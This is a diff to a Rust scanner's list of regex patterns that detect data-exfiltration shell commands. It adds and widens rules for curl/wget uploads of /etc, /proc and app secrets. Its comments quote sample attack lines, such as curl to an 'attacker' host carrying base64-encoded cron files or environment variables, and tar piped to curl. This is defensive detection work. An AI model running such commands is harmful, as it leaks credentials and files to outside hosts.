@@ -361,6 +361,17 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                     .expect("Invalid regex"),
                 "system file substitution posted to network (exfiltration)",
             ),
+            // Substitution inside the URL itself (wave-66:
+            // \`curl http://attacker/?d=$(base64 /var/spool/cron/…)\`,
+            // \`curl https://hook/?env=$(env | base64)\`) — the
+            // encode-then-network patterns assumed encode-first ordering.
+            (
+                Regex::new(
+                    r"(?i)(curl|wget)\s+[^|\n]*\$\(\s*(base64|cat|env)\b[^)]*/(etc|var|root|proc|home|app/(config|secrets))",
+                )
+                .expect("Invalid regex"),
+                "encoded sensitive path in request URL (exfiltration)",
+            ),
             // Archive-to-network (wave-17: `tar czf - ./src | curl -X POST
             // --data-binary @- URL`, `tar -czf - . | curl -X PUT …`) —
             // whole-tree exfil in one pipe.
@@ -373,7 +384,7 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // POST -F 'file=@/etc/nginx/nginx.conf' URL`) — the -d @/path
             // pattern only covers data flags, not -F file fields.
             (
-                Regex::new(r#"(curl|wget)\s+[^|\n]*-[fF]\s+['"]?[a-z_]*=?@/(etc|var|root|home)/"#)
+                Regex::new(r#"(curl|wget)\s+[^|\n]*-[fF]\s+['"]?[a-z_]*=?@/(etc|var|root|home|proc|app/(\.env|config|secrets))/"#)
                     .expect("Invalid regex"),
                 "system file uploaded as form field (exfiltration)",
             ),
@@ -661,7 +672,7 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             ),
             (
                 Regex::new(
-                    r"(curl|wget)\s+[^|\n]*(-d[\s,]+@|--data(-binary|-raw)?[\s,]+@)/(etc|root|home|var|proc|app/\.env)",
+                    r"(curl|wget)\s+[^|\n]*(-d[\s,]+@|--data(-binary|-raw)?[\s,]+@)/(etc|root|home|var|proc|app/(\.env|config|secrets))",
                 )
                 .expect("Invalid regex"),
                 "sensitive file posted to remote (exfiltration)",
